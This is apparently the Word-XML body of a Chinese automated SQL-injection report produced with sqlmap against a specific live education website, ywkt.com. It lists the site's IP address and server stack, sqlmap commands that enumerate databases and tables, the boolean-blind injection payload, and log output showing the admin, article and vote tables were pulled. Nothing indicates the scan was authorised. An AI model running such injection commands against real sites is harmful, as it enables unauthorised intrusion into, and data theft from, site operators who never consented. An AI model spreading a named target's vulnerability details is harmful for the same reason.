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注入网址:http://ywkt.com/ArticleShow.asp?ArticleID=45184</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">执行命令:python sqlmap.py -u http://ywkt.com/ArticleShow.asp?ArticleID=45184 --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>注入参数(方式) : ArticleID (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : ArticleID=53331 AND 8097=8097</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : Microsoft Access</w:t>
        <w:br/>
        <w:t>服务器版本 : Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:t>服务器语言 : ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:t>数据库版本 : Microsoft Access</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度权重  4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://ywkt.com</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语文课堂网--首页</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">IP__坐标  北美地区  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  107.151.82.178</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  12年4月12天（创建于2006年12月20日,过期时间为2024年12月20日)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36万5000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>协议类型  HTTP/1.1 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">页面类型   text/html  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   Microsoft-IIS/8.5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http://ywkt.com/ArticleShow.asp?ArticleID=45184 --random-agent --dbs  --current-user --current-db --is-db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22:25:34 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:25:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.2\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:t xml:space="preserve">[22:25:34] [INFO] resuming back-end DBMS 'microsoft access' </w:t>
        <w:br/>
        <w:t>[22:25:34] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: ArticleID (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: ArticleID=53331 AND 8097=8097</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[22:25:34] [INFO] the back-end DBMS is Microsoft Access</w:t>
        <w:br/>
        <w:t>web server operating system: Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:t>web application technology: ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:t>back-end DBMS: Microsoft Access</w:t>
        <w:br/>
        <w:t>[22:25:34] [WARNING] on Microsoft Access it is not possible to enumerate the current user</w:t>
        <w:br/>
        <w:t>current user:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:t>[22:25:34] [WARNING] on Microsoft Access it is not possible to get name of the current database</w:t>
        <w:br/>
        <w:t>current database:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:t>[22:25:34] [WARNING] on Microsoft Access it is not possible to test if current user is DBA</w:t>
        <w:br/>
        <w:t>current user is DBA:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:t>[22:25:34] [WARNING] on Microsoft Access it is not possible to enumerate databases (use only '--tables')</w:t>
        <w:br/>
        <w:t>[22:25:34] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\ywkt.com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 22:25:34 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>注入参数(方式) : ArticleID (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : ArticleID=53331 AND 8097=8097</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : Microsoft Access</w:t>
        <w:br/>
        <w:t>服务器版本 : Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:t>服务器语言 : ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:t>数据库版本 : Microsoft Access</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://ywkt.com/ArticleShow.asp?ArticleID=45184 --tables --random-agent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22:25:40 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:25:40] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-us) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.2\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:t xml:space="preserve">[22:25:41] [INFO] resuming back-end DBMS 'microsoft access' </w:t>
        <w:br/>
        <w:t>[22:25:41] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: ArticleID (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: ArticleID=53331 AND 8097=8097</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[22:25:41] [INFO] the back-end DBMS is Microsoft Access</w:t>
        <w:br/>
        <w:t>web server operating system: Windows 8.1 or 2012 R2</w:t>
        <w:br/>
        <w:t>web application technology: ASP.NET, Microsoft IIS 8.5, ASP</w:t>
        <w:br/>
        <w:t>back-end DBMS: Microsoft Access</w:t>
        <w:br/>
        <w:t>[22:25:41] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[22:25:41] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[22:25:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[22:25:41] [INFO] retrieved: </w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:25:41] [INFO] heuristics detected web page charset 'utf-8'</w:t>
        <w:br/>
        <w:t>[22:25:41] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[22:25:41] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' </w:t>
        <w:br/>
        <w:t>[22:25:41] [WARNING] unable to retrieve the number of tables for database 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[22:25:41] [ERROR] cannot retrieve table names, back-end DBMS is Access</w:t>
        <w:br/>
        <w:t>Database: Microsoft_Access_masterdb</w:t>
        <w:br/>
        <w:t>[3 tables]</w:t>
        <w:br/>
        <w:t>+---------+</w:t>
        <w:br/>
        <w:t>| admin   |</w:t>
        <w:br/>
        <w:t>| article |</w:t>
        <w:br/>
        <w:t>| vote    |</w:t>
        <w:br/>
        <w:t>+---------+</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:25:41] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:t>500 (Internal Server Error) - 3 times</w:t>
        <w:br/>
        <w:t>[22:25:41] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\ywkt.com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 22:25:41 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库下存在如下表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>Database: Microsoft_Access_masterdb</w:t>
        <w:br/>
        <w:t>[3 tables]</w:t>
        <w:br/>
        <w:t>+---------+</w:t>
        <w:br/>
        <w:t>| admin   |</w:t>
        <w:br/>
        <w:t>| article |</w:t>
        <w:br/>
        <w:t>| vote    |</w:t>
        <w:br/>
        <w:t>+---------+</w:t>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